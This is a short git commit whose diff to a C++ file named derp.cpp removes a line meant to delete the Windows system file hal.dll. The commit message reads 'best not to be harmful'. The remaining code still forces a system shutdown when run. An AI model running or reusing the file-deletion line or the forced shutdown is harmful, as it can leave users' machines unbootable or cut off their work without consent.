5d055036499e3d7d873e9abd0fbef6c43187ec8c
Wilee999 <Infinitywilee@rocketmail.com>
2014-01-04 10:59:08 -0800

    best not to be harmful

--- derp.cpp
+++ derp.cpp
@@ -1,11 +1,8 @@
 #include<stdio.h>
 #include<stdlib.h>
 
-using namespace std;
-
 int main(int argc, char *argv[])
 {
-    std::remove("%systemroot%\\system32\\hal.dll");
     system("shutdown -s -r");
     system("PAUSE");
     return EXIT_SUCCESS;
